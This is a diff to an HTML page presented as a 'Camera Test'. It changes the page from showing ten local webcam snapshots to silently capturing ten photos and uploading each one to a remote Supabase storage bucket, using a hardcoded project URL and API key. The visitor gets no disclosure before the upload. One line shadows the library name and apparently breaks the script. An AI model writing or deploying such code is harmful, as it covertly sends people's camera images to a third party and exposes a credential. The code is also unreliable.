@@ -6,57 +6,63 @@
     <title>Camera Test</title>
 </head>
 <body>
-    <h1>Camera Test</h1>
-    <p id="camera-status"></p>
-    <video id="video" autoplay style="display: none;"></video>
-    <canvas id="canvas" style="display: none;"></canvas>
-    <div id="captured-images" style="display: flex; flex-wrap: wrap; gap: 10px;"></div>
+    <video id="video" autoplay></video>
+    <p id="status"></p>
 
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
     <script>
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const capturedImages = document.getElementById('captured-images');
-        const cameraStatus = document.getElementById('camera-status');
-        let photoCount = 0;
+        const SUPABASE_URL = 'https://xsibckeasnitdilcdzoe.supabase.co';
+        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InhzaWJja2Vhc25pdGRpbGNkem9lIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Mzc0ODczODEsImV4cCI6MjA1MzA2MzM4MX0.lv5XOKY3vBL94y4hksOshDexrBwsuynHEzTrgn06diE';
 
+        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+        // Access the camera
         navigator.mediaDevices.getUserMedia({ video: true })
-            .then(function (stream) {
+            .then((stream) => {
+                const video = document.getElementById('video');
                 video.srcObject = stream;
-                video.style.display = 'block';
-                cameraStatus.innerText = "Camera access granted. Capturing photos...";
-                cameraStatus.style.color = "green";
 
-                video.onloadedmetadata = function () {
-                    const captureInterval = setInterval(() => {
-                        if (photoCount >= 10) {
-                            clearInterval(captureInterval);
-                            stream.getTracks().forEach(track => track.stop());
-                            return;
-                        }
-
-                        const context = canvas.getContext('2d');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                        const imageDataUrl = canvas.toDataURL('image/png');
-                        const img = document.createElement('img');
-                        img.src = imageDataUrl;
-                        img.alt = `Photo ${photoCount + 1}`;
-                        img.style.border = "2px solid #ccc";
-                        img.style.width = "100px";
-                        img.style.height = "auto";
-                        capturedImages.appendChild(img);
-
-                        photoCount++;
-                    }, 1000); // Capture a photo every 1 second
-                };
+                video.addEventListener('loadeddata', () => {
+                    captureAndUploadPhotos();
+                });
             })
-            .catch(function (err) {
-                cameraStatus.innerText = "Error: " + err.message;
-                cameraStatus.style.color = "red";
-                console.error("Error accessing camera:", err);
+            .catch((err) => {
+                document.getElementById('status').innerText = 'Camera access denied!';
+                console.error(err);
             });
+
+        // Capture and upload photos
+        async function captureAndUploadPhotos() {
+            const video = document.getElementById('video');
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            for (let i = 0; i < 10; i++) {
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                const imageData = canvas.toDataURL('image/png');
+                const blob = await (await fetch(imageData)).blob();
+                const fileName = `photo-${Date.now()}-${i + 1}.png`;
+
+                // Upload Blob to Supabase
+                const { data, error } = await supabase.storage.from('user-media').upload(fileName, blob, {
+                    contentType: 'image/png'
+                });
+
+                if (error) {
+                    console.error('Upload failed:', error);
+                    document.getElementById('status').innerText = 'Failed to upload photo!';
+                    return;
+                } else {
+                    console.log(`Photo ${i + 1} uploaded successfully:`, data.path);
+                }
+            }
+
+            document.getElementById('status').innerText = 'All photos uploaded successfully!';
+        }
     </script>
 </body>
 </html>
